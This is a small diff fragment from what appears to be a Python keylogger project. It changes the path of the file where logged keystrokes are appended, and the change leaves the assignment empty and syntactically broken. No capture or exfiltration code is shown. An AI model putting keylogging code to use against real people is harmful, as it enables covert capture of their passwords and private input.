@@ -20,7 +20,7 @@ kill_command = ['k','i','l']
 kill_array = []
 
 # File path for the logged keys file, and file access mode
-file_path = "C:\\Users\\baker\\OneDrive\\Documents\\My Stuff\\Personal\\Security Stuff\\security_stuff\\Key_Logger\\array_logged_keys.txt"
+file_path = 
 access_mode = "a"
 
 # Opening file and accessing it using access mode above
